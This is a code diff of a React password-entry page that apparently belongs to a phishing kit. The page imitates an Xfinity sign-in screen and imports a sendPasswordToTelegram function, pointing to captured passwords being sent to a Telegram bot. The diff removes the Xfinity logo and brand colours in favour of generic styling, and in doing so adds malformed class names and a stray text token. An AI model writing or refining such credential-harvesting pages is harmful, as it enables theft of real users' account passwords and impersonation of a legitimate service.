@@ -1,7 +1,7 @@
 import { useState } from "react";
 import { Link, useLocation, useNavigate } from "react-router-dom";
 import { Eye, EyeOff, LoaderCircle } from "lucide-react";
-import Logo from "@/assets/xfinity-logo-grey.svg";
+import Logo from "@/assets/logo-grey.svg";
 import Footer from "@/components/Footer/Footer";
 import { sendPasswordToTelegram } from "@/bot/telegrambot";
 
@@ -49,16 +49,16 @@ const LoginPassword = () => {
           <img
             src={Logo}
             alt=""
-            className="translate-y-[6px]"
+            className=""
             width={70}
           />
 
-          <div className="space-y-4 translate-y-[16px]">
+          <div className="space-y-4 ">
             <p className="text-sm text-black font-semibold">{email}</p>
             <h1 className="text-3xl font-bold text-foreground leading-tight">Enter your password</h1>
           </div>
 
-          <form onSubmit={handleSubmit} className="space-y-8 translate-y-[6px]">
+          <form onSubmit={handleSubmit} className="space-y-7">
             <div className="relative">
               <input
                 type={showPassword ? "text" : "password"}
@@ -80,7 +80,7 @@ const LoginPassword = () => {
             </div>
 
             <div className="flex items-center gap-x-4 text-sm">
-              <Link to="#" className="text-xfinity-purple font-semibold hover:underline">Forgot password?</Link>
+              <Link to="#" className="text-violet-800 font-semibold hover:underline">Forgot password?</Link>
               <span className="text-muted-foreground">·</span>
             </div>
 
@@ -89,27 +89,27 @@ const LoginPassword = () => {
                 type="checkbox"
                 checked={keepSignedIn}
                 onChange={(e) => setKeepSignedIn(e.target.checked)}
-                className="h-6 w-6 rounded border-border accent-xfinity-purple"
+                className="h-6 w-6 rounded border-border accent-vtext-violet-800"
               />
               Keep me signed in
             </label>
 
             <p className="text-sm text-neutral-900 leading-relaxed">
               By signing in, you agree to our{" "}
-              <Link to="#" className="text-xfinity-purple underline">
+              <span className="text-violet-800 underline">
                 Terms of Service
-              </Link>{" "}
-              and{" "}
-              <Link to="#" className="text-xfinity-purple underline">
+              </span>{" "}
+              and{" "}span
+              <span  className="text-violet-800 underline">
                 Privacy Policy
-              </Link>.
+              </span>.
             </p>
 
             <button
               type="submit"
               disabled={loading}
               aria-busy={loading}
-              className="group relative block h-12 w-28 items-center justify-center overflow-hidden rounded-sm bg-xfinity-purple px-4 font-semibold leading-none text-primary-foreground transition-all duration-300 ease-out hover:-translate-y-0.5 hover:bg-xfinity-purple-hover hover:shadow-md active:translate-y-0 active:scale-[0.99] disabled:cursor-not-allowed disabled:hover:translate-y-0 disabled:hover:shadow-none disabled:opacity-60"
+              className="group relative block h-12 w-28 items-center justify-center overflow-hidden rounded-sm bg-violet-800 px-4 font-semibold leading-none text-primary-foreground transition-all duration-300 ease-out hover:-translate-y-0.5 hover:bg-vtext-violet-800-hover hover:shadow-md active:translate-y-0 active:scale-[0.99] disabled:cursor-not-allowed disabled:hover:translate-y-0 disabled:hover:shadow-none disabled:opacity-60"
             >
               <span
                 aria-hidden="true"
@@ -130,7 +130,7 @@ const LoginPassword = () => {
 
             <p className="text-sm text-neutral-900 leading-relaxed gap-2 flex">
               Trouble signing in?
-              <Link to="#" className="text-xfinity-purple underline">
+              <Link to="#" className="text-violet-800 underline">
                 Get help
               </Link>
             </p>
